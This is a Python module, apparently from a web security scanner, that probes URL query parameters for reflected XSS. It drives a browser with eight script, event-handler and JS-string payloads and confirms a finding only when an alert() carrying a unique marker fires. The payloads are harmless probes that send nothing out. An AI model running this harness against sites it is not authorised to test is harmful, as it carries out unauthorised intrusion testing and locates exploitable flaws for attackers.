"""Controlled, execution-confirmed XSS testing (Fase 14).

Safe by construction: a unique marker is injected and a finding is only confirmed
when the marker actually *executes* (a JS dialog fires with it). Reflection alone is
never reported as a vulnerability. Bounded payloads, one parameter at a time, no
brute force. Must be gated by the caller (run only when safe-mode is OFF).
"""
from __future__ import annotations

from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
import secrets

from .browser import BrowserRuntime
from .file_utils import ensure_dir
from .models import XssResult


# Progressive payloads (≤8). {m} is the unique per-parameter marker.
_PAYLOADS: list[tuple[str, str]] = [
    ("<script>alert('{m}')</script>", "html"),
    ("\"><script>alert('{m}')</script>", "attribute"),
    ("'><script>alert('{m}')</script>", "attribute"),
    ("\"><img src=x onerror=alert('{m}')>", "event_handler"),
    ("<img src=x onerror=alert('{m}')>", "event_handler"),
    ("\"><svg onload=alert('{m}')>", "event_handler"),
    ("';alert('{m}');//", "js_string"),
    ("<svg/onload=alert('{m}')>", "event_handler"),
]


def _testable_params(url: str) -> list[str]:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def _set_param(url: str, key: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    rebuilt = [(k, value if k == key else v) for k, v in pairs]
    return urlunparse(parsed._replace(query=urlencode(rebuilt)))


def run_xss_tests(
    targets: list[str],
    *,
    headless: bool = True,
    timeout: int = 15,
    user_agent: str = "",
    auth_state: str | None = None,
    evidence_dir: str | Path = "evidence",
    max_targets: int = 10,
    max_params: int = 3,
) -> list[XssResult]:
    """Test reflected/DOM XSS on URLs that carry query parameters."""
    ev_dir = ensure_dir(Path(evidence_dir) / "xss")
    # Keep only URLs with at least one query parameter, dedup by (path, sorted params).
    seen: set[str] = set()
    candidates: list[str] = []
    for url in targets:
        params = _testable_params(url)
        if not params:
            continue
        parsed = urlparse(url)
        key = f"{parsed.netloc}{parsed.path}?{','.join(sorted(params))}"
        if key in seen:
            continue
        seen.add(key)
        candidates.append(url)
        if len(candidates) >= max_targets:
            break

    results: list[XssResult] = []
    if not candidates:
        return results

    idx = 0
    with BrowserRuntime(headless=headless, timeout=timeout, user_agent=user_agent,
                        storage_state=auth_state) as rt:
        for url in candidates:
            for param in _testable_params(url)[:max_params]:
                idx += 1
                results.append(_test_param(rt, url, param, ev_dir, idx))
    return results


def _test_param(rt: BrowserRuntime, url: str, param: str, ev_dir: Path, idx: int) -> XssResult:
    marker = "PXSS" + secrets.token_hex(4)
    reflected = False
    encoded = False
    last_payload = ""
    last_context = "unknown"

    for template, context in _PAYLOADS:
        payload = template.format(m=marker)
        last_payload, last_context = payload, context
        target = _set_param(url, param, payload)
        before = len(rt.dialogs)
        try:
            # Rate-limit guard: 1.5s between XSS payloads
            import time as _time
            _time.sleep(1.5)
            rt.goto(target)
            rt.page.wait_for_timeout(700)
        except Exception:
            continue

        # ── Confirmation: a dialog fired carrying our marker = real execution ──
        fired = [d for d in rt.dialogs[before:] if marker in str(d.get("message", ""))]
        if fired:
            shot = ev_dir / f"{idx:02d}-{param}-confirmed.png"
            try:
                rt.page.screenshot(path=str(shot))
            except Exception:
                shot = ""
            proof = ev_dir / f"{idx:02d}-{param}-confirmed.txt"
            proof.write_text(
                f"url: {target}\nparam: {param}\npayload: {payload}\n"
                f"dialog: {fired[0].get('message')}\ncontext: {context}\n",
                encoding="utf-8",
            )
            return XssResult(
                url=url, parameter=param, context=context, status="confirmed_xss",
                severity="high", marker=marker, payload=payload,
                evidence=[str(shot), str(proof)],
                notes=[f"alert() executed with marker via {context} context"],
                cwe="CWE-79",
            )

        # ── No execution: inspect reflection to classify ──
        try:
            content = rt.page.content()
        except Exception:
            content = ""
        if marker in content:
            reflected = True
            # marker present but the injected angle brackets were entity-encoded
            if "&lt;" in content and f"<script>alert('{marker}')" not in content:
                encoded = True

    if reflected and not encoded:
        return XssResult(
            url=url, parameter=param, context=last_context, status="reflected_only",
            severity="low", marker=marker, payload=last_payload,
            notes=["marker reflected unencoded but did not execute — verify context manually"],
            cwe="CWE-79",
        )
    if reflected and encoded:
        return XssResult(
            url=url, parameter=param, context=last_context, status="blocked_or_encoded",
            severity="info", marker=marker, payload=last_payload,
            notes=["marker reflected but HTML-encoded; output encoding appears effective"],
        )
    return XssResult(
        url=url, parameter=param, context="unknown", status="no_reflection",
        severity="info", marker=marker, payload=last_payload,
        notes=["marker not reflected in response"],
    )
